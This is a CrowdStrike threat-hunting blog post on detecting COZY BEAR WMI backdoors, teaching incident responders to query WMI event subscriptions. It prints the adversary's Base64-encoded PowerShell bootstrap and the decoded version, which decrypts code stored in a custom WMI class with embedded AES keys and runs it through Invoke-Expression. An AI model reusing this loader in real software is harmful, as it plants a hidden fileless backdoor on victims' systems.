# Bear Hunting: Tracking Down COZY BEAR Backdoors

- **Source :** crowdstrike
- **URL :** https://www.crowdstrike.com/en-us/blog/bear-hunting-tracking-cozybear-backdoors/
- **Date :** September 27, 2016

---

# Bear Hunting: Tracking Down COZY BEAR Backdoors

September 27, 2016

• [ Ryan McCombs](/en-us/blog/author.ryan-mccombs/ "Posts by Ryan McCombs") • [Threat Hunting & Intel](/en-us/blog/category.counter-adversary-operations/ "Threat Hunting & Intel")


As a follow-up to the CrowdStrike blog entry ["Bears in the Midst"](/blog/bears-midst-intrusion-democratic-national-committee.html) on June 15, 2016, we will walk through the methods leveraged by CrowdStrike to recover a [COZY BEAR](https://www.crowdstrike.com/adversaries/cozy-bear/) WMI backdoor. The recovery of the backdoor illuminates additional indicators organizations can leverage to further scope potential COZY BEAR activity in their networks.

The most effective means of identifying a COZY BEAR WMI implant is to query Event Filters, Event Consumers, and Filter To Consumer Bindings within Windows Management Instrumentation (WMI). This can be collected enterprise-wide by leveraging the following PowerShell script and redirecting the output to a file.
    
    
    $Computers = Get-Content hosts.txt
    $Cred = Get-Credential$CommonArgs = @{
    Namespace = 'root\subscription'
    ComputerName = $Computers
    Credential = $Cred
    }Get-WmiObject @CommonArgs -Class '__EventFilter'
    Get-WmiObject @CommonArgs -Class '__EventConsumer'
    Get-WmiObject @CommonArgs -Class '__FilterToConsumerBinding'
    

Note: HOSTS.TXT file can contain IP addresses or hostnames associated with the systems in your enterprise. When examining the output of the script, it is essential to identify known-good entries. Many legitimate entries will include references to “SCM Event Log Filter” and/or “BVTFilter”, however most other entries should be closely scrutinized. Table 1 below contains an example of a known-good Event Filter, Event Consumer, and Filter To Consumer Binding for the SCM Event Filter.

![bear-hunting-image002](https://www.crowdstrike.com/content/dam/crowdstrike/www/en-us/wp/2016/09/bear-hunting-image002.png)_T_

_able 1. Legitimate WMI Event Information_

Below we will dive into two types of nefarious examples CrowdStrike has observed during our investigations, one for a SEADADDY implant and another for a bootstrap to a WMI class created by the adversary.

#### SEADADDY Implant

![bear-hunting-image003](https://www.crowdstrike.com/content/dam/crowdstrike/www/en-us/wp/2016/09/bear-hunting-image003.png)_Table 2. WMI Event Information for SEADADDY Backdoor_

The persistence mechanism put in place for SEADADDY pointed us directly to the binary, C:\Windows\pagemgr.exe, found in the Event Consumer.

#### Bootstrap to Malicious WMI Class

_![bear-hunting-image005](https://www.crowdstrike.com/content/dam/crowdstrike/www/en-us/wp/2016/09/bear-hunting-image005.png)Table 3. WMI Event Information for Bootstrap to Malicious WMI Class_

The Event Consumer for the bootstrap to the malicious WMI class contains a Base64 encoded PowerShell command. The full Base64 encoded string is below.

`ZgB1AG4AYwB0AGkAbwBuACAAcABlAHIAZgBDAHIAKAAkAGMAcgBUAHIALAAgACQAZABhAHQAYQApAA0ACgB7AA0ACgAJACQAcgBlAHQAIAA9ACAAJABuAHUAbABsAA0ACgAJAHQAcgB5AHsADQAKAAkACQAkAG0AcwAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBJAE8ALgBNAGUAbQBvAHIAeQBTAHQAcgBlAGEAbQANAAoACQAJACQAYwBzACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAFMAZQBjAHUAcgBpAHQAeQAuAEMAcgB5AHAAdABvAGcAcgBhAHAAaAB5AC4AQwByAHkAcAB0AG8AUwB0AHIAZQBhAG0AIAAtAEEAcgBnAHUAbQBlAG4AdABMAGkAcwB0ACAAQAAoACQAbQBzACwAIAAkAGMAcgBUAHIALAAgAFsAUwB5AHMAdABlAG0ALgBTAGUAYwB1AHIAaQB0AHkALgBDAHIAeQBwAHQAbwBnAHIAYQBwAGgAeQAuAEMAcgB5AHAAdABvAFMAdAByAGUAYQBtAE0AbwBkAGUAXQA6ADoAVwByAGkAdABlACkADQAKAAkACQAkAGMAcwAuAFcAcgBpAHQAZQAoACQAZABhAHQAYQAsACAAMAAsACAAJABkAGEAdABhAC4ATABlAG4AZwB0AGgAKQANAAoACQAJACQAYwBzAC4ARgBsAHUAcwBoAEYAaQBuAGEAbABCAGwAbwBjAGsAKAApAA0ACgAJAAkAJAByAGUAdAAgAD0AIAAkAG0AcwAuAFQAbwBBAHIAcgBhAHkAKAApAA0ACgAJAAkAJABjAHMALgBDAGwAbwBzAGUAKAApAA0ACgAJAAkAJABtAHMALgBDAGwAbwBzAGUAKAApAA0ACgAJAH0ADQAKAAkAYwBhAHQAYwBoAHsAfQANAAoACQByAGUAdAB1AHIAbgAgACQAcgBlAHQADQAKAH0ADQAKAA0ACgBmAHUAbgBjAHQAaQBvAG4AIABkAGUAYwByAEEAZQBzACgAJABlAG4AYwBEAGEAdABhACwAIAAkAGsAZQB5ACwAIAAkAGkAdgApAA0ACgB7AA0ACgAJACQAcgBlAHQAIAA9ACAAJABuAHUAbABsAA0ACgAJAHQAcgB5AHsADQAKAAkACQAkAHAAcgBvAHYAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4AUwBlAGMAdQByAGkAdAB5AC4AQwByAHkAcAB0AG8AZwByAGEAcABoAHkALgBSAGkAagBuAGQAYQBlAGwATQBhAG4AYQBnAGUAZAANAAoACQAJACQAcAByAG8AdgAuAEsAZQB5ACAAPQAgACQAawBlAHkADQAKAAkACQAkAHAAcgBvAHYALgBJAFYAIAA9ACAAJABpAHYADQAKAAkACQAkAGQAZQBjAHIAIAA9ACAAJABwAHIAbwB2AC4AQwByAGUAYQB0AGUARABlAGMAcgB5AHAAdABvAHIAKAAkAHAAcgBvAHYALgBLAGUAeQAsACAAJABwAHIAbwB2AC4ASQBWACkADQAKAAkACQAkAHIAZQB0ACAAPQAgAHAAZQByAGYAQwByACAAJABkAGUAYwByACAAJABlAG4AYwBEAGEAdABhAA0ACgAJAH0ADQAKAAkAYwBhAHQAYwBoAHsAfQANAAoACQByAGUAdAB1AHIAbgAgACQAcgBlAHQADQAKAH0ADQAKAA0ACgBmAHUAbgBjAHQAaQBvAG4AIABzAFcAUAAoACQAYwBOACwAIAAkAHAATgAsACAAJABhAEsALAAgACQAYQBJACkADQAKAHsADQAKAAkAaQBmACgAJABjAE4AIAAtAGUAcQAgACQAbgB1AGwAbAAgAC0AbwByACAAJABwAE4AIAAtAGUAcQAgACQAbgB1AGwAbAApAHsAcgBlAHQAdQByAG4AIAAkAGYAYQBsAHMAZQB9AA0ACgAJAHQAcgB5AHsADQAKAAkACQAkAHcAcAAgAD0AIAAoAFsAdwBtAGkAYwBsAGEAcwBzAF0AJABjAE4AKQAuAFAAcgBvAHAAZQByAHQAaQBlAHMAWwAkAHAATgBdAC4AVgBhAGwAdQBlAA0ACgAJAAkAJABlAHgARQBuACAAPQAgAFsAQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAJAB3AHAAKQANAAoACQAJACQAZQB4AEQAZQBjACAAPQAgAGQAZQBjAHIAQQBlAHMAIAAkAGUAeABFAG4AIAAkAGEASwAgACQAYQBJAA0ACgAJAAkAJABlAHgAIAA9ACAAWwBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAZQB4AEQAZQBjACkADQAKAAkACQBpAGYAKAAkAGUAeAAgAC0AZQBxACAAJABuAHUAbABsACAALQBvAHIAIAAkAGUAeAAgAC0AZQBxACAAJwAnACkADQAKAAkACQB7AHIAZQB0AHUAcgBuAH0ADQAKAAkACQBJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAkAGUAeAANAAoACQAJAHIAZQB0AHUAcgBuACAAJAB0AHIAdQBlAA0ACgAJAH0ADQAKAAkAYwBhAHQAYwBoAHsADQAKAAkACQByAGUAdAB1AHIAbgAgACQAZgBhAGwAcwBlAA0ACgAJAH0ADQAKAH0ADQAKAA0ACgAkAGEAZQBLACAAPQAgAFsAYgB5AHQAZQBbAF0AXQAgACgAMAB4AGUANwAsACAAMAB4AGQANgAsACAAMAB4AGIAZQAsACAAMAB4AGEAOQAsACAAMAB4AGIANwAsACAAMAB4AGUANgAsACAAMAB4ADUANQAsACAAMAB4ADMAYQAsACAAMAB4AGUAZQAsACAAMAB4ADEANgAsACAAMAB4ADcAOQAsACAAMAB4AGMAYQAsACAAMAB4ADUANgAsACAAMAB4ADAAZgAsACAAMAB4AGIAYwAsACAAMAB4ADMAZgAsACAAMAB4ADIAMgAsACAAMAB4AGUAZAAsACAAMAB4AGYAZgAsACAAMAB4ADAAMgAsACAAMAB4ADQAMwAsACAAMAB4ADQAYwAsACAAMAB4ADEAYgAsACAAMAB4AGMAMAAsACAAMAB4AGUANwAsACAAMAB4ADUANwAsACAAMAB4AGIAMgAsACAAMAB4AGMAYgAsACAAMAB4AGQAOAAsACAAMAB4AGMAZQAsACAAMAB4AGQAYQAsACAAMAB4ADAAMAApAA0ACgAkAGEAZQBJACAAPQAgAFsAYgB5AHQAZQBbAF0AXQAgACgAMAB4AGIAZQAsACAAMAB4ADcAYQAsACAAMAB4ADkAMAAsACAAMAB4AGQAOQAsACAAMAB4AGQANQAsACAAMAB4AGYANwAsACAAMAB4AGEAYQAsACAAMAB4ADYAZAAsACAAMAB4AGUAOQAsACAAMAB4ADEANgAsACAAMAB4ADYANAAsACAAMAB4ADEAZAAsACAAMAB4ADkANwAsACAAMAB4ADEANgAsACAAMAB4AGMAMAAsACAAMAB4ADYANwApAA0ACgBzAFcAUAAgACcAVwBtAGkAJwAgACcAVwBtAGkAJwAgACQAYQBlAEsAIAAkAGEAZQBJACAAfAAgAE8AdQB0AC0ATgB1AGwAbAA=`

Decoding the Base64 encoded string gives us the following:
    
    
    function perfCr($crTr, $data)
    {
    $ret = $null
    try{
    $ms = New-Object System.IO.MemoryStream
    $cs = New-Object System.Security.Cryptography.CryptoStream -ArgumentList @($ms, $crTr, [System.Security.Cryptography.CryptoStreamMode]::Write)
    $cs.Write($data, 0, $data.Length)
    $cs.FlushFinalBlock()
    $ret = $ms.ToArray()
    $cs.Close()
    $ms.Close()
    }
    catch{}
    return $ret
    }
    function decrAes($encData, $key, $iv)
    {
    $ret = $null
    try{
    $prov = New-Object System.Security.Cryptography.RijndaelManaged
    $prov.Key = $key
    $prov.IV = $iv
    $decr = $prov.CreateDecryptor($prov.Key, $prov.IV)
    $ret = perfCr $decr $encData
    }
    catch{}
    return $ret
    }
    function sWP($cN, $pN, $aK, $aI)
    {
    if($cN -eq $null -or $pN -eq $null){return $false}
    try{
    $wp = ([wmiclass]$cN).Properties[$pN].Value
    $exEn = [Convert]::FromBase64String($wp)
    $exDec = decrAes $exEn $aK $aI
    $ex = [Text.Encoding]::UTF8.GetString($exDec)
    if($ex -eq $null -or $ex -eq '')
    {return}
    Invoke-Expression $ex
    return $true
    }
    catch{
    return $false
    }
    }
    $aeK = [byte[]] (0xe7, 0xd6, 0xbe, 0xa9, 0xb7, 0xe6, 0x55, 0x3a, 0xee, 0x16, 0x79, 0xca, 0x56, 0x0f, 0xbc, 0x3f, 0x22, 0xed, 0xff, 0x02, 0x43, 0x4c, 0x1b, 0xc0, 0xe7, 0x57, 0xb2, 0xcb, 0xd8, 0xce, 0xda, 0x00)
    $aeI = [byte[]] (0xbe, 0x7a, 0x90, 0xd9, 0xd5, 0xf7, 0xaa, 0x6d, 0xe9, 0x16, 0x64, 0x1d, 0x97, 0x16, 0xc0, 0x67)
    sWP 'Wmi' 'Wmi' $aeK $aeI | Out-Null
    

Focusing on the final line of the above code, two strings are passed, each containing ‘Wmi’, to the ‘sWP’ function along with keys for decryption. During its investigations, CrowdStrike has observed the decryption keys were unique and specific for the malicious WMI class created. Following the code in the ‘sWP’ function, we can see an interesting entry:
    
    
    $wp = ($cN).Properties<$pN>.Value
    

From TechNet, “ is described as a type accelerator for ManagementClass. This has a string constructor that takes a local or absolute WMI path to a WMI class and returns an object that is bound to that class,” essentially a shortcut to a WMI class definition. In this instance, the adversary created a WMI class and associated property, each named ‘Wmi’ to store malicious code. This malicious WMI class and associated property were created earlier in the adversary kill chain. Below is a screenshot for querying the class definition on an affected system leveraging the strings passed to the original function. ![](https://www.crowdstrike.com/content/dam/crowdstrike/www/en-us/wp/2016/09/original-function.png) We have an encoded and encrypted output. So what’s the easiest way to get access to the code? You could: 1. Parse OBJECTS.DATA of the affected system and attempt to piece together the Base64 encoded strings in the file for later decryption 2. Create your own decryption routine based on the keys in the bootstrap code 3. Modify one line in the current bootstrap, leverage the adversary’s decryption routine, and get the output. The last option being the fastest and most efficient, the following modification was made to the bootstrap and saved to a PowerShell script to be executed later:

Invoke-Expression $ex ----> Write-Host $ex

Executing the created script in the exact way as the Event Consumer PowerShell command, save for the EncodedCommand switch, will present you with the actual backdoor in all its glory. ![](https://www.crowdstrike.com/content/dam/crowdstrike/www/en-us/wp/2016/09/EncodedCommand-.png)

Above, we discussed the process used by CrowdStrike analysts when recently investigating COZY BEAR backdoors. This process should help illuminate further indicators of compromise, give an organization the ability to decrypt captured network traffic, and further demonstrate the inherent complexity of a custom backdoor being leveraged by nation-state adversaries. 

Happy Hunting!

[ ](https://www.linkedin.com/shareArticle) [ ](https://twitter.com/share)

* * *

#### Related Content

[ ![PhantomRaven: An LLM-Generated Information Stealer Developed for Bug Bounty Hunting](https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-InfoStealer?wid=2048&hei=1349&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0) Threat Hunting & Intel | Sep 15, 2026  PhantomRaven: An LLM-Generated Information Stealer Developed for Bug Bounty Hunting ](/en-us/blog/phantomraven-llm-generated-information-stealer-for-bug-bounty-hunting/) [ ![Peer Pressure: Inside the Sality Botnet Disruption Operation](https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-FalCon-Sality?wid=1060&hei=698&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0) Threat Hunting & Intel | Sep 01, 2026  Peer Pressure: Inside the Sality Botnet Disruption Operation ](/en-us/blog/inside-sality-botnet-disruption-operation/) [ ![CrowdStrike 2026 Threat Hunting Report: Exploitation Window Closes as AI Use Accelerates](https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-THR-2026?wid=1060&hei=698&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0) Threat Hunting & Intel | Aug 03, 2026  CrowdStrike 2026 Threat Hunting Report: Exploitation Window Closes as AI Use Accelerates ](/en-us/blog/crowdstrike-2026-threat-hunting-report/)